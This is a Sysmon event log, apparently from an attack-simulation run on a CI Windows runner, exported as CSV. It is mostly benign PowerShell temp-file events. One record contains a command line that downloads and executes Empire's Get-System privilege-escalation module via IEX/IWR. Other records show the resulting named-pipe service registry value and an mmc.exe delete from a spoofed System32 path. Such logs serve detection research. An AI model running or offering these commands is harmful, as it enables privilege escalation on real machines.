"TimeCreated","Id","Message"
"12/17/2025 8:02:59 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 08:02:59.689
ProcessGuid: {f995aebf-5511-6942-0c00-000000000e00}
ProcessId: 972
Image: C:\Windows\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\Services\TestSVC\ImagePath
Details: %%COMSPEC%% /C start %%COMSPEC%% /C ""timeout /t 3 >nul&&echo TestSVC > \\.\pipe\TestSVC""
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:02:59 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:59.034
ProcessGuid: {f995aebf-63b2-6942-d206-000000000e00}
ProcessId: 7204
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_svz1lci5.2sb.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:59 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:59.016
ProcessGuid: {f995aebf-63b2-6942-d206-000000000e00}
ProcessId: 7204
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_svz1lci5.2sb.ps1
CreationUtcTime: 2025-12-17 08:02:59.016
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:58 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:58.946
ProcessGuid: {f995aebf-63b2-6942-d206-000000000e00}
ProcessId: 7204
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:55 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:55.976
ProcessGuid: {f995aebf-63af-6942-c406-000000000e00}
ProcessId: 3084
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_qsznmatz.w4c.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:55 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:55.959
ProcessGuid: {f995aebf-63af-6942-c406-000000000e00}
ProcessId: 3084
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_qsznmatz.w4c.ps1
CreationUtcTime: 2025-12-17 08:02:55.959
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:55 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:55.502
ProcessGuid: {f995aebf-63af-6942-c006-000000000e00}
ProcessId: 9636
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_u2tnansh.wzj.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:55 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:55.484
ProcessGuid: {f995aebf-63af-6942-c006-000000000e00}
ProcessId: 9636
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_u2tnansh.wzj.ps1
CreationUtcTime: 2025-12-17 08:02:55.484
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:55 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:55.038
ProcessGuid: {f995aebf-63ae-6942-be06-000000000e00}
ProcessId: 5944
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_apsye3ra.1hz.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:55 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:55.022
ProcessGuid: {f995aebf-63ae-6942-be06-000000000e00}
ProcessId: 5944
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_apsye3ra.1hz.ps1
CreationUtcTime: 2025-12-17 08:02:55.022
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:54 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:54.685
ProcessGuid: {f995aebf-63ae-6942-bc06-000000000e00}
ProcessId: 5588
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_11bxlw2x.hjf.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:54 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:54.667
ProcessGuid: {f995aebf-63ae-6942-bc06-000000000e00}
ProcessId: 5588
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_11bxlw2x.hjf.ps1
CreationUtcTime: 2025-12-17 08:02:54.667
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:54 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:54.325
ProcessGuid: {f995aebf-63ae-6942-ba06-000000000e00}
ProcessId: 8364
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_00sml1ym.zcw.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:54 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:54.307
ProcessGuid: {f995aebf-63ae-6942-ba06-000000000e00}
ProcessId: 8364
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_00sml1ym.zcw.ps1
CreationUtcTime: 2025-12-17 08:02:54.307
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:53 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:53.963
ProcessGuid: {f995aebf-63ad-6942-b806-000000000e00}
ProcessId: 6708
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_h5de3znt.al2.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:53 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:53.945
ProcessGuid: {f995aebf-63ad-6942-b806-000000000e00}
ProcessId: 6708
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_h5de3znt.al2.ps1
CreationUtcTime: 2025-12-17 08:02:53.945
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:53 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:53.601
ProcessGuid: {f995aebf-63ad-6942-b606-000000000e00}
ProcessId: 896
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_tnf4htxq.lnp.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:53 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:53.586
ProcessGuid: {f995aebf-63ad-6942-b606-000000000e00}
ProcessId: 896
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_tnf4htxq.lnp.ps1
CreationUtcTime: 2025-12-17 08:02:53.584
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:53 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:53.155
ProcessGuid: {f995aebf-63ad-6942-b506-000000000e00}
ProcessId: 6580
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_g0wmr02s.d2z.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:53 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:53.136
ProcessGuid: {f995aebf-63ad-6942-b506-000000000e00}
ProcessId: 6580
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_g0wmr02s.d2z.ps1
CreationUtcTime: 2025-12-17 08:02:53.136
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:52 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:52.692
ProcessGuid: {f995aebf-63ac-6942-b206-000000000e00}
ProcessId: 8752
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_23hmf5xy.bpk.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:52 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:52.673
ProcessGuid: {f995aebf-63ac-6942-b206-000000000e00}
ProcessId: 8752
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_23hmf5xy.bpk.ps1
CreationUtcTime: 2025-12-17 08:02:52.673
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:52 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:52.225
ProcessGuid: {f995aebf-63ac-6942-af06-000000000e00}
ProcessId: 3128
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_otchg1vk.vx1.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:52 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:52.208
ProcessGuid: {f995aebf-63ac-6942-af06-000000000e00}
ProcessId: 3128
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_otchg1vk.vx1.ps1
CreationUtcTime: 2025-12-17 08:02:52.208
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:51 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:51.771
ProcessGuid: {f995aebf-63ab-6942-ac06-000000000e00}
ProcessId: 3120
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_0jwmrklp.rfa.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:51 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:51.753
ProcessGuid: {f995aebf-63ab-6942-ac06-000000000e00}
ProcessId: 3120
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_0jwmrklp.rfa.ps1
CreationUtcTime: 2025-12-17 08:02:51.751
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:51 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:51.313
ProcessGuid: {f995aebf-63ab-6942-a906-000000000e00}
ProcessId: 6160
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_d14qmfd5.pbr.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:51 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:51.295
ProcessGuid: {f995aebf-63ab-6942-a906-000000000e00}
ProcessId: 6160
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_d14qmfd5.pbr.ps1
CreationUtcTime: 2025-12-17 08:02:51.295
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:50 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:50.850
ProcessGuid: {f995aebf-63aa-6942-a606-000000000e00}
ProcessId: 7452
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_4uid434o.vsg.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:50 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:50.833
ProcessGuid: {f995aebf-63aa-6942-a606-000000000e00}
ProcessId: 7452
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_4uid434o.vsg.ps1
CreationUtcTime: 2025-12-17 08:02:50.831
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:50 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:50.392
ProcessGuid: {f995aebf-63aa-6942-a306-000000000e00}
ProcessId: 4212
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_vfrtghep.men.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:50 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:50.374
ProcessGuid: {f995aebf-63aa-6942-a306-000000000e00}
ProcessId: 4212
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_vfrtghep.men.ps1
CreationUtcTime: 2025-12-17 08:02:50.374
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:49 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:49.824
ProcessGuid: {f995aebf-63a9-6942-a006-000000000e00}
ProcessId: 5592
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_nt3gclbu.ngz.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:49 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:49.807
ProcessGuid: {f995aebf-63a9-6942-a006-000000000e00}
ProcessId: 5592
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_nt3gclbu.ngz.ps1
CreationUtcTime: 2025-12-17 08:02:49.807
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:48 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:48.906
ProcessGuid: {f995aebf-63a8-6942-9706-000000000e00}
ProcessId: 8120
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_4htci2ui.ntu.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:48 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:48.888
ProcessGuid: {f995aebf-63a8-6942-9706-000000000e00}
ProcessId: 8120
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_4htci2ui.ntu.ps1
CreationUtcTime: 2025-12-17 08:02:48.886
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:48 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:48.625
ProcessGuid: {f995aebf-63a8-6942-9506-000000000e00}
ProcessId: 2132
User: runnervm8j6r3\runneradmin
Image: C:\Windows\SYSTEM32\cmd.exe
TargetFilename: C:\Windows \System32\mmc.exe
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
IsExecutable: true
Archived: true"
"12/17/2025 8:02:48 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:48.234
ProcessGuid: {f995aebf-63a8-6942-9306-000000000e00}
ProcessId: 5176
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_kgzzg2vz.m3a.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:48 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:48.216
ProcessGuid: {f995aebf-63a8-6942-9306-000000000e00}
ProcessId: 5176
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_kgzzg2vz.m3a.ps1
CreationUtcTime: 2025-12-17 08:02:48.216
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:47 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:47.774
ProcessGuid: {f995aebf-63a7-6942-9106-000000000e00}
ProcessId: 6460
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_tmfay3bt.hh5.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:47 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:47.754
ProcessGuid: {f995aebf-63a7-6942-9106-000000000e00}
ProcessId: 6460
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_tmfay3bt.hh5.ps1
CreationUtcTime: 2025-12-17 08:02:47.754
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:47 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:47.089
ProcessGuid: {f995aebf-63a6-6942-8c06-000000000e00}
ProcessId: 4432
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_n0k2lq3f.tx2.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:47 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:47.069
ProcessGuid: {f995aebf-63a6-6942-8c06-000000000e00}
ProcessId: 4432
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_n0k2lq3f.tx2.ps1
CreationUtcTime: 2025-12-17 08:02:47.069
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:40 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:40.526
ProcessGuid: {f995aebf-63a0-6942-7a06-000000000e00}
ProcessId: 6708
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_pn3q3kpg.1vo.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:40 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:40.508
ProcessGuid: {f995aebf-63a0-6942-7a06-000000000e00}
ProcessId: 6708
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_pn3q3kpg.1vo.ps1
CreationUtcTime: 2025-12-17 08:02:40.508
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:40 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:02:38.919
ProcessGuid: {f995aebf-639e-6942-7106-000000000e00}
ProcessId: 10216
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.149
SourceHostname: runnervm8j6r3.o3imerjm4krehdeh0rvc5luiwc.bx.internal.cloudapp.net
SourcePort: 59169
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.110.133
DestinationHostname: cdn-185-199-110-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:02:40 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:02:38.915
ProcessGuid: {f995aebf-639e-6942-7106-000000000e00}
ProcessId: 10216
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:39 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:39.909
ProcessGuid: {f995aebf-639f-6942-7506-000000000e00}
ProcessId: 2100
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_yepmzvhe.qiq.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:39 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:02:37.992
ProcessGuid: {f995aebf-639d-6942-6f06-000000000e00}
ProcessId: 8660
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.149
SourceHostname: runnervm8j6r3.o3imerjm4krehdeh0rvc5luiwc.bx.internal.cloudapp.net
SourcePort: 59168
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.110.133
DestinationHostname: cdn-185-199-110-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:02:39 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:39.890
ProcessGuid: {f995aebf-639f-6942-7506-000000000e00}
ProcessId: 2100
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_yepmzvhe.qiq.ps1
CreationUtcTime: 2025-12-17 08:02:39.890
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:39 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:39.374
ProcessGuid: {f995aebf-639f-6942-7306-000000000e00}
ProcessId: 9208
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_m5yj0cdj.1vu.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
